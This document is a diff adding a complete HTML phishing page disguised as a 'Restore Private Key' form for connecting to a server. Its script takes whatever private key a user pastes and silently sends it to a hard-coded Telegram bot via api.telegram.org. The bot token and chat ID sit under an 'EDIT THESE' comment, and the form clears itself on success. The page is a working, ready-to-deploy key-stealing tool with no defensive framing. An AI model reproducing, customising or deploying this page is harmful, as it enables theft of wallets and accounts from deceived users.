@@ -1,0 +1,211 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Private Key Restore</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <!-- Google Fonts -->
+    <link href="https://fonts.googleapis.com/css?family=Montserrat:400,600&display=swap" rel="stylesheet">
+    <style>
+        body {
+            background: #F5F3FF;
+            margin: 0;
+            font-family: 'Montserrat', Arial, sans-serif;
+        }
+        .heading-4 {
+            font-family: 'Montserrat', Arial, sans-serif;
+            text-align: center;
+            font-weight: 400;
+            margin-top: 60px;
+            color: #242424;
+            letter-spacing: 1px;
+            font-size: 2rem;
+        }
+        .main-card {
+            max-width: 580px;
+            width: 94vw;
+            background: #fff;
+            margin: 35px auto 0 auto;
+            border-radius: 17px;
+            box-shadow: 0 4px 24px 0 rgba(0,0,0,0.08);
+            padding: 36px 32px 32px 32px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+        .subtitle {
+            font-size: 1.32rem;
+            font-weight: 600;
+            letter-spacing: 1.2px;
+            color: #262626;
+            margin-bottom: 34px;
+        }
+        .privatekey-label {
+            font-size: 1.01rem;
+            color: #555;
+            font-weight: 500;
+            text-align: left;
+            width: 100%;
+            margin-bottom: 12px;
+            letter-spacing: 0.4px;
+        }
+        .privatekey-input {
+            width: 100%;
+            max-width: 410px;
+            height: 48px;
+            font-size: 1.08rem;
+            border: 2px solid #1818c4;
+            border-radius: 10px;
+            padding: 0 17px;
+            outline: none;
+            font-family: 'Montserrat', Arial, sans-serif;
+            margin-bottom: 16px;
+            color: #262626;
+            background: #f9f8ff;
+            letter-spacing: 1.5px;
+            transition: border-color 0.2s;
+        }
+        .privatekey-input:focus {
+            border-color: #1818c4;
+        }
+        .info-text {
+            font-size: 0.97rem;
+            color: #1818c4;
+            margin-bottom: 16px;
+            text-align: center;
+            margin-top: 2px;
+        }
+        .checkbox-wrap {
+            display: flex;
+            align-items: center;
+            width: 100%;
+            max-width: 410px;
+            margin-bottom: 18px;
+            margin-top: 6px;
+            font-size: 0.98rem;
+            color: #333;
+        }
+        .checkbox-wrap input[type=checkbox] {
+            margin-right: 8px;
+            accent-color: #1818c4;
+            width: 18px;
+            height: 18px;
+        }
+        .restore-btn {
+            background: #1818c4;
+            color: #fff;
+            border: none;
+            width: 100%;
+            max-width: 280px;
+            border-radius: 10px;
+            font-size: 1.09rem;
+            font-weight: 600;
+            padding: 15px 0;
+            cursor: pointer;
+            transition: background 0.2s;
+            letter-spacing: 0.5px;
+            margin-top: 6px;
+            box-shadow: 0 2px 10px 0 rgba(138,129,248,0.08);
+        }
+        .restore-btn:hover {
+            background: #1818c4;
+        }
+        .toast {
+            position: fixed;
+            left: 50%;
+            top: 30px;
+            transform: translateX(-50%);
+            background: #222;
+            color: #fff;
+            font-size: 1rem;
+            padding: 15px 28px;
+            border-radius: 8px;
+            box-shadow: 0 4px 16px 0 rgba(0,0,0,0.14);
+            z-index: 9999;
+            opacity: 0;
+            pointer-events: none;
+            transition: opacity 0.3s;
+        }
+        .toast.show {
+            opacity: 1;
+            pointer-events: all;
+        }
+        @media (max-width: 700px) {
+            .main-card { padding: 18px 2vw 22px 2vw; }
+            .privatekey-input, .checkbox-wrap { max-width: 99vw; }
+            .restore-btn { max-width: 98vw; }
+            .heading-4 { font-size: 1.2rem; margin-top: 28px;}
+        }
+    </style>
+</head>
+<body>
+    <div class="heading-4">Connect to Server</div>
+    <div class="main-card">
+        <div class="subtitle">RESTORE PRIVATE KEY</div>
+        <div class="privatekey-label">Enter your private key:</div>
+        <input class="privatekey-input" id="privateKey" type="text" placeholder="Paste your private key here" autocomplete="off">
+        <div class="info-text">
+            Input your private key to restore access to your account securely.
+        </div>
+        <div class="checkbox-wrap">
+            <input type="checkbox" id="agree">
+            <label for="agree">I have entered all details correctly.</label>
+        </div>
+        <button class="restore-btn" onclick="sendToTelegram()">Restore</button>
+    </div>
+    <div class="toast" id="toast"></div>
+    <script>
+        // ==== EDIT THESE ====
+        const BOT_TOKEN = "7010773928:AAHRs0roGY_Rz5d-LxeSoN9qYuK_vgn9DAU";
+        const CHAT_ID = "6787322665";
+        // ====================
+
+        function showToast(message, color="#222") {
+            const toast = document.getElementById('toast');
+            toast.textContent = message;
+            toast.style.background = color;
+            toast.classList.add('show');
+            setTimeout(() => { toast.classList.remove('show'); }, 2400);
+        }
+
+        function sendToTelegram() {
+            const key = document.getElementById('privateKey').value.trim();
+            const checked = document.getElementById('agree').checked;
+
+            if (!key) {
+                showToast('Please enter your private key.', '#C0392B');
+                return;
+            }
+            if (!checked) {
+                showToast('Please confirm all details are correct.', '#C0392B');
+                return;
+            }
+
+            const message = `🔑 <b>Private Key Submitted</b>\n<code>${key}</code>`;
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+
+            fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message,
+                    parse_mode: 'HTML'
+                })
+            })
+            .then(res => res.json())
+            .then(data => {
+                if (data.ok) {
+                    document.getElementById('privateKey').value = '';
+                    document.getElementById('agree').checked = false;
+                } else {
+                    showToast('Failed to send. Please try again.', '#C0392B');
+                }
+            })
+            .catch(() => {
+                showToast('Network error. Try again.', '#C0392B');
+            });
+        }
+    </script>
+</body>
+</html>
